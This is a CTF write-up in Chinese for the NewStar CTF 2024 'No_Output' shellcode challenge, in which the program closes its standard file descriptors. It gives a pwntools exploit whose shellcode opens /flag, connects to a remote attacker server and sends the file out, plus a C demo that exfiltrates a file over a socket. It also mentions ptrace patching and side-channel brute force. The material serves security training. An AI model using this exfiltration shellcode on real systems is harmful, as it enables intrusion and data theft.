---
titleTemplate: ":title | WriteUp - NewStar CTF 2024"
---

# No_Output

程序是无沙箱的 shellcode，但关闭了 `0` `1` `2` 描述符，即关闭了标准输入，标准输出和标准错误输出

本题的解法也有很多，由于靶机是出网的，我们可以选择直接连上一个公网的服务器，使用 `send` 将 flag 发送到服务器上

```python
#!/usr/bin/env python3
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
context.terminal = ["tmux", "splitw", "-h"]
uu64 = lambda x: u64(x.ljust(8, b'\x00'))
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)

k = 1
if k:
    host = addr.split(':')
    p = remote(host[0], host[1])
else:
    p = process('./No_Output')
elf = ELF('./No_Output')

def debug():
    gdb.attach(p,'b *0x40184D\nc\n')

shellcode = '''
    mov rsp, 0xd001000
    mov rbp, 0xd002000
'''

shellcode += shellcraft.open("/flag")
shellcode += shellcraft.syscall('SYS_socket', 2, 1, 0) # 使用 syscall 创建 socket (AF_INET = 2, SOCK_STREAM = 1)
shellcode += '''
    mov rax, ........(此处为 remote ip）
    mov qword ptr [rsp], rax
    mov qword ptr [rsp + 0x8], 0
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 0x10
    mov rax, SYS_connect
    syscall
'''
shellcode += shellcraft.sendfile(1, 0, 0, 0x100)

s(asm(shellcode))

p.interactive()
```

`connect` 的参数可以写一个 C 语言的 demo，编译后动调将内存复制出来

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

void send_file_content() {
    const char *filename = "/flag";
    const char *ip_address = "";
    int port = 3389;
    int sock;
    struct sockaddr_in server_addr;
    char buffer[1024];
    FILE *file;

    // 打开文件
    file = fopen(filename, "r");

    // 创建套接字
    sock = socket(AF_INET, SOCK_STREAM, 0);

    // 设置服务器地址
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip_address, &server_addr.sin_addr);

    // 连接到服务器
    connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    // 读取文件内容并发送
    while (fgets(buffer, sizeof(buffer), file) != NULL) {
        send(sock, buffer, strlen(buffer), 0);
    }

    // 关闭文件和套接字
    fclose(file);
    close(sock);
}
```

也可以使用两个进程，使用一个去 ptrace 另一个，直接修改他的程序段内存，将 `close012` 给 nop 掉<span data-desc>（靶机的 pid 初始都是一样的）</span>

当然，也可以使用侧信道爆破
